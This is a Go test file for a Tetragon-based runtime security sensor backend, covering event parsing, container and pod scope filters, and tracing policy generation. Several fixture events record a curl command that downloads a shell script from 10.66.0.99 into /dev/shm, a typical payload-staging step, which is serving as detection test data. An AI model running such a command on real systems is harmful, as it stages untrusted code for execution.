package tetragon

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/sysarmor/sysarmor-next-project/internal/sensor/contract"
)

func TestBackendSubscribesJSONLFile(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("apiVersion: cilium.io/v1alpha1\nkind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	if err := os.WriteFile(eventPath, []byte(raw+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{ObserveOnly: true})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		if ev.RawRef == "" || ev.SensorEvent.GetRawRef() == "" {
			t.Fatalf("raw ref was not populated: %+v", ev)
		}
		got = append(got, ev.SensorEvent.GetBehavior())
	}
	if len(got) != 2 || got[0] != "process.exec" || got[1] != "file.write" {
		t.Fatalf("got behaviors %v, want process.exec, file.write", got)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if !health.PolicyLoaded || health.EventsSeen != 2 {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendFiltersProcessLifecycleByCollectionIntent(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	rawExec := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","flags":"execve clone","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	rawExit := `{"process_exit":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
	if err := os.WriteFile(eventPath, []byte(rawExec+"\n"+rawExit+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{
		Behaviors: []string{"process.fork"},
	})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
	}
	if len(got) != 1 || got[0] != "process.fork" {
		t.Fatalf("got behaviors %v, want only process.fork", got)
	}
}

func TestCapabilityReportsHostProbeFields(t *testing.T) {
	dir := t.TempDir()
	btfPath := filepath.Join(dir, "vmlinux")
	if err := os.WriteFile(btfPath, []byte("btf"), 0o644); err != nil {
		t.Fatal(err)
	}
	bpffsPath := filepath.Join(dir, "bpf")
	if err := os.Mkdir(bpffsPath, 0o755); err != nil {
		t.Fatal(err)
	}
	tetraPath := filepath.Join(dir, "tetra")
	if err := os.WriteFile(tetraPath, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	tetragonPath := filepath.Join(dir, "tetragon")
	if err := os.WriteFile(tetragonPath, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle("policy.yaml", "", "test", BundleConfig{TetraPath: tetraPath, TetragonPath: tetragonPath})
	backend.BTFPath = btfPath
	backend.BPFFSPath = bpffsPath
	backend.RequireBTF = true
	backend.RequireBPFFS = true
	capability, err := backend.Capability(context.Background())
	if err != nil {
		t.Fatalf("Capability() error = %v", err)
	}
	if capability.KernelRelease == "" || !capability.BTFAvailable || !capability.BPFFSAvailable {
		t.Fatalf("capability = %+v", capability)
	}
	if !capabilityHasField(capability.Collection, "network.connect", "socket.port") {
		t.Fatalf("collection capability missing network.connect socket.port: %+v", capability.Collection)
	}
}

func capabilityHasField(items []contract.CollectionBehaviorCapability, behavior, field string) bool {
	for _, item := range items {
		if item.Behavior != behavior {
			continue
		}
		for _, got := range item.Fields {
			if got == field {
				return true
			}
		}
	}
	return false
}

func TestCapabilityFailsWhenRequiredBTFMissing(t *testing.T) {
	backend := NewBackend("policy.yaml", "events.jsonl", "test")
	backend.BTFPath = filepath.Join(t.TempDir(), "missing-vmlinux")
	backend.RequireBTF = true
	_, err := backend.Capability(context.Background())
	if err == nil || !strings.Contains(err.Error(), "btf unavailable") {
		t.Fatalf("Capability() error = %v, want btf unavailable", err)
	}
	health, healthErr := backend.Health(context.Background())
	if healthErr != nil {
		t.Fatalf("Health() error = %v", healthErr)
	}
	if !strings.Contains(health.LastError, "btf unavailable") {
		t.Fatalf("health = %+v", health)
	}
}

func TestCapabilityFailsWhenConfiguredBinaryNotExecutable(t *testing.T) {
	dir := t.TempDir()
	tetraPath := filepath.Join(dir, "tetra")
	if err := os.WriteFile(tetraPath, []byte("not executable"), 0o644); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle("policy.yaml", "", "test", BundleConfig{TetraPath: tetraPath})
	_, err := backend.Capability(context.Background())
	if err == nil || !strings.Contains(err.Error(), "not executable") {
		t.Fatalf("Capability() error = %v, want not executable", err)
	}
}

func TestBackendFiltersByContainerIDPrefix(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	rawHost := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z","docker":""},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	rawNode := `{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:01Z","docker":"abcdef0123456789"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
	if err := os.WriteFile(eventPath, []byte(rawHost+"\n"+rawNode+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	backend.ContainerIDPrefix = "abcdef"
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
		if ev.SensorEvent.GetContainerId() != "abcdef0123456789" {
			t.Fatalf("container id = %q", ev.SensorEvent.GetContainerId())
		}
	}
	if len(got) != 1 || got[0] != "process.exec" {
		t.Fatalf("got behaviors %v, want one process.exec", got)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.EventsSeen != 1 {
		t.Fatalf("EventsSeen = %d, want filtered count 1", health.EventsSeen)
	}
}

func TestBackendFiltersByContainerScope(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	rawHost := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z","docker":""},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	rawNode := `{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:01Z","docker":"abcdef0123456789"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
	if err := os.WriteFile(eventPath, []byte(rawHost+"\n"+rawNode+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{
		ScopeType:     "container",
		ScopeSelector: "abcdef",
	})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
		if ev.SensorEvent.GetContainerId() != "abcdef0123456789" {
			t.Fatalf("container id = %q", ev.SensorEvent.GetContainerId())
		}
	}
	if len(got) != 1 || got[0] != "process.exec" {
		t.Fatalf("got behaviors %v, want one process.exec", got)
	}
}

func TestBackendFiltersByCgroupScope(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	rawOther := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z","docker":"other-cgroup"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	rawNode := `{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:01Z","docker":"kubepods.slice/workload-a.scope"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
	if err := os.WriteFile(eventPath, []byte(rawOther+"\n"+rawNode+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{
		ScopeType:     "cgroup",
		ScopeSelector: "kubepods.slice/workload-a",
	})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
		if ev.SensorEvent.GetProc().GetCgroup() != "kubepods.slice/workload-a.scope" {
			t.Fatalf("cgroup = %q", ev.SensorEvent.GetProc().GetCgroup())
		}
	}
	if len(got) != 1 || got[0] != "process.exec" {
		t.Fatalf("got behaviors %v, want one process.exec", got)
	}
}

func TestBackendFiltersByNamespaceScope(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	rawOther := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z","docker":"other-cgroup"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	rawNode := `{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:01Z","docker":"kubepods.slice/pod-a.scope"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
	if err := os.WriteFile(eventPath, []byte(rawOther+"\n"+rawNode+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{
		ScopeType:     "namespace",
		ScopeSelector: "kubepods.slice/pod-a",
	})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
		if ev.SensorEvent.GetProc().GetCgroup() != "kubepods.slice/pod-a.scope" {
			t.Fatalf("cgroup = %q", ev.SensorEvent.GetProc().GetCgroup())
		}
	}
	if len(got) != 1 || got[0] != "process.exec" {
		t.Fatalf("got behaviors %v, want one process.exec", got)
	}
}

func TestBackendFiltersByPodScope(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	rawOther := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z","docker":"other-pod"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	rawNode := `{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:01Z","docker":"pod-a-abcdef"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
	if err := os.WriteFile(eventPath, []byte(rawOther+"\n"+rawNode+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{
		ScopeType:     "pod",
		ScopeSelector: "pod-a",
	})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
		if ev.SensorEvent.GetContainerId() != "pod-a-abcdef" {
			t.Fatalf("container id = %q", ev.SensorEvent.GetContainerId())
		}
	}
	if len(got) != 1 || got[0] != "process.exec" {
		t.Fatalf("got behaviors %v, want one process.exec", got)
	}
}

func TestBackendRecordsDroppedEvents(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	if err := os.WriteFile(eventPath, []byte("{\"health\":{\"dropped_events\":5}}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	for range events {
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.EventsDropped != 5 || !strings.Contains(health.LastError, "dropped events") {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendManagedEventCommandSubscribesStdout(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed event command test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	tetraPath := filepath.Join(dir, "tetra")
	script := "#!/bin/sh\nprintf '%s\\n' '" + raw + "'\n"
	if err := os.WriteFile(tetraPath, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	tetragonPath := filepath.Join(dir, "tetragon")
	if err := os.WriteFile(tetragonPath, []byte("#!/bin/sh\nwhile [ $# -gt 0 ]; do shift; done\nsleep 5\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle(policyPath, "", "test", BundleConfig{TetraPath: tetraPath, TetragonPath: tetragonPath})
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
	}
	if len(got) != 1 || got[0] != "process.exec" {
		t.Fatalf("got behaviors %v, want process.exec", got)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.RestartCount != 2 || health.LastExitReason == "" {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendManagedEventCommandRecordsDroppedEvents(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed dropped-event test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	tetraPath := filepath.Join(dir, "tetra")
	script := "#!/bin/sh\nprintf '%s\\n' '{\"health\":{\"dropped_events\":2}}'\nprintf '%s\\n' '" + raw + "'\nprintf '%s\\n' '{\"dropped_events\":3}'\n"
	if err := os.WriteFile(tetraPath, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle(policyPath, "", "test", BundleConfig{TetraPath: tetraPath})
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
	}
	if len(got) != 1 || got[0] != "process.exec" {
		t.Fatalf("got behaviors %v, want process.exec", got)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.EventsDropped != 5 || health.ParseErrors != 0 || !strings.Contains(health.LastError, "dropped events") {
		t.Fatalf("health = %+v", health)
	}
}

func TestBenignEventSourceReadErrorIgnored(t *testing.T) {
	if !isBenignEventSourceReadError(ioEOFError("read |0: file already closed")) {
		t.Fatal("expected file already closed to be benign")
	}
	if !isBenignEventSourceReadError(ioEOFError("read |0: closed pipe")) {
		t.Fatal("expected closed pipe to be benign")
	}
	if isBenignEventSourceReadError(ioEOFError("unexpected EOF")) {
		t.Fatal("unexpected EOF should not be benign")
	}
}

type ioEOFError string

func (e ioEOFError) Error() string { return string(e) }

func TestBackendAppliesGeneratedTracingPolicy(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed policy apply test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "collection.yaml")
	if err := os.WriteFile(policyPath, []byte(`{"behaviors":["process.exec","network.connect","file.open"],"observe_only":true}
`), 0o644); err != nil {
		t.Fatal(err)
	}
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	appliedPath := filepath.Join(dir, "applied")
	tetraPath := filepath.Join(dir, "tetra")
	tetraScript := "#!/bin/sh\nif [ \"$1 $2\" = \"tracingpolicy add\" ]; then cp \"$3\" '" + appliedPath + "'; exit 0; fi\nif [ \"$1 $2\" = \"tracingpolicy list\" ]; then printf '%s\\n' 'sysarmor-runtime-collection'; exit 0; fi\nprintf '%s\\n' '" + raw + "'\n"
	if err := os.WriteFile(tetraPath, []byte(tetraScript), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle(policyPath, "", "test", BundleConfig{TetraPath: tetraPath})
	intent := contract.CollectionIntent{
		Behaviors:   []string{"process.exec", "network.connect", "file.open"},
		ObserveOnly: true,
	}
	if err := backend.Apply(context.Background(), intent); err != nil {
		t.Fatalf("Apply() error = %v", err)
	}
	events, err := backend.Subscribe(context.Background(), intent)
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	for range events {
	}
	data, err := os.ReadFile(appliedPath)
	if err != nil {
		t.Fatalf("generated tracing policy was not applied: %v", err)
	}
	for _, want := range []string{"kind: TracingPolicy", "security_socket_connect", "security_file_permission"} {
		if !strings.Contains(string(data), want) {
			t.Fatalf("generated policy missing %q:\n%s", want, string(data))
		}
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if !health.PolicyLoaded {
		t.Fatalf("health = %+v", health)
	}
}

func TestBuildTracingPolicyUsesCollectionFilters(t *testing.T) {
	data := string(buildTracingPolicy(contract.CollectionIntent{
		Behaviors:      []string{"process.exec", "network.connect", "file.write"},
		BinaryPrefixes: []string{"/var/lib/app/plugins"},
		FilePrefixes:   []string{"/dev/shm", "/var/lib/app/plugins"},
		SocketFamilies: []string{"AF_INET"},
		SocketAddrs:    []string{"10.66.0.99"},
		SocketPorts:    []string{"443", "8080"},
	}))
	for _, want := range []string{"security_bprm_creds_from_file", `"Prefix"`, `"security_socket_connect"`, `"AF_INET"`, `"SAddr"`, `"10.66.0.99"`, `"SPort"`, `"443"`, `"8080"`, `"security_file_permission"`, `"/dev/shm"`, `"/var/lib/app/plugins"`} {
		if !strings.Contains(data, want) {
			t.Fatalf("generated policy missing %q:\n%s", want, data)
		}
	}
	if strings.Contains(data, "AF_INET6") {
		t.Fatalf("generated policy should honor explicit socket families:\n%s", data)
	}
}

func TestBackendLiveApplyReplacesGeneratedTracingPolicy(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed policy live apply test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "collection.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	appliedPath := filepath.Join(dir, "applied")
	opsPath := filepath.Join(dir, "ops")
	tetraPath := filepath.Join(dir, "tetra")
	tetraScript := "#!/bin/sh\nif [ \"$1 $2\" = \"tracingpolicy add\" ]; then echo add >> '" + opsPath + "'; cp \"$3\" '" + appliedPath + "'; exit 0; fi\nif [ \"$1 $2\" = \"tracingpolicy delete\" ]; then echo delete >> '" + opsPath + "'; exit 0; fi\nif [ \"$1 $2\" = \"tracingpolicy list\" ]; then printf '%s\\n' 'sysarmor-runtime-collection'; exit 0; fi\nexit 0\n"
	if err := os.WriteFile(tetraPath, []byte(tetraScript), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle(policyPath, "", "test", BundleConfig{TetraPath: tetraPath})
	oldIntent := contract.CollectionIntent{
		Behaviors:    []string{"file.write"},
		FilePrefixes: []string{"/old"},
		ObserveOnly:  true,
	}
	if err := backend.Apply(context.Background(), oldIntent); err != nil {
		t.Fatalf("initial Apply() error = %v", err)
	}
	backend.mu.Lock()
	backend.policyLoaded = true
	backend.runtimePolicyApplied = true
	backend.mu.Unlock()
	newIntent := contract.CollectionIntent{
		Behaviors:      []string{"network.connect"},
		SocketFamilies: []string{"AF_INET"},
		ObserveOnly:    true,
	}
	if err := backend.Apply(context.Background(), newIntent); err != nil {
		t.Fatalf("live Apply() error = %v", err)
	}
	ops, err := os.ReadFile(opsPath)
	if err != nil {
		t.Fatal(err)
	}
	if strings.TrimSpace(string(ops)) != "delete\nadd" {
		t.Fatalf("ops = %q", string(ops))
	}
	applied, err := os.ReadFile(appliedPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(applied), "security_socket_connect") || strings.Contains(string(applied), "/old") {
		t.Fatalf("applied policy =\n%s", string(applied))
	}
}

func TestBackendDeletesGeneratedTracingPolicyOnStop(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed policy cleanup test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "collection.yaml")
	if err := os.WriteFile(policyPath, []byte(`{"behaviors":["process.exec"],"observe_only":true}
`), 0o644); err != nil {
		t.Fatal(err)
	}
	addedPath := filepath.Join(dir, "added")
	deletedPath := filepath.Join(dir, "deleted")
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	tetraPath := filepath.Join(dir, "tetra")
	tetraScript := "#!/bin/sh\nif [ \"$1 $2\" = \"tracingpolicy add\" ]; then cp \"$3\" '" + addedPath + "'; exit 0; fi\nif [ \"$1 $2\" = \"tracingpolicy list\" ]; then printf '%s\\n' 'sysarmor-runtime-collection'; exit 0; fi\nif [ \"$1 $2\" = \"tracingpolicy delete\" ]; then printf '%s' \"$3\" > '" + deletedPath + "'; exit 0; fi\nprintf '%s\\n' '" + raw + "'\nsleep 30\n"
	if err := os.WriteFile(tetraPath, []byte(tetraScript), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle(policyPath, "", "test", BundleConfig{TetraPath: tetraPath})
	intent := contract.CollectionIntent{
		Behaviors:   []string{"process.exec"},
		ObserveOnly: true,
	}
	if err := backend.Apply(context.Background(), intent); err != nil {
		t.Fatalf("Apply() error = %v", err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	events, err := backend.Subscribe(ctx, intent)
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	select {
	case <-events:
	case <-time.After(time.Second):
		t.Fatal("timed out waiting for event")
	}
	cancel()
	select {
	case _, ok := <-events:
		for ok {
			_, ok = <-events
		}
	case <-time.After(time.Second):
		t.Fatal("timed out waiting for subscription close")
	}
	if _, err := os.Stat(addedPath); err != nil {
		t.Fatalf("generated tracing policy was not applied: %v", err)
	}
	data, err := os.ReadFile(deletedPath)
	if err != nil {
		t.Fatalf("generated tracing policy was not deleted: %v", err)
	}
	if string(data) != runtimeTracingPolicyName {
		t.Fatalf("deleted policy = %q, want %q", string(data), runtimeTracingPolicyName)
	}
}

func TestBackendRejectsUnverifiedGeneratedTracingPolicy(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed policy verify test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "collection.yaml")
	if err := os.WriteFile(policyPath, []byte(`{"behaviors":["network.connect"],"observe_only":true}
`), 0o644); err != nil {
		t.Fatal(err)
	}
	tetraPath := filepath.Join(dir, "tetra")
	tetraScript := "#!/bin/sh\nif [ \"$1 $2\" = \"tracingpolicy add\" ]; then exit 0; fi\nif [ \"$1 $2\" = \"tracingpolicy list\" ]; then printf '%s\\n' 'other-policy'; exit 0; fi\nexit 0\n"
	if err := os.WriteFile(tetraPath, []byte(tetraScript), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle(policyPath, "", "test", BundleConfig{TetraPath: tetraPath})
	intent := contract.CollectionIntent{
		Behaviors:   []string{"network.connect"},
		ObserveOnly: true,
	}
	if err := backend.Apply(context.Background(), intent); err != nil {
		t.Fatalf("Apply() error = %v", err)
	}
	if _, err := backend.Subscribe(context.Background(), intent); err == nil || !strings.Contains(err.Error(), "not listed") {
		t.Fatalf("Subscribe() error = %v, want not listed", err)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.PolicyLoaded || !strings.Contains(health.LastError, "not listed") {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendRestartsManagedSensorProcess(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed sensor restart test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	countPath := filepath.Join(dir, "count")
	tetragonPath := filepath.Join(dir, "tetragon")
	tetragonScript := "#!/bin/sh\nwhile [ $# -gt 0 ]; do shift; done\nCOUNT='" + countPath + "'\nn=0\nif [ -f \"$COUNT\" ]; then n=$(cat \"$COUNT\"); fi\nn=$((n+1))\nprintf '%s' \"$n\" > \"$COUNT\"\nexit 7\n"
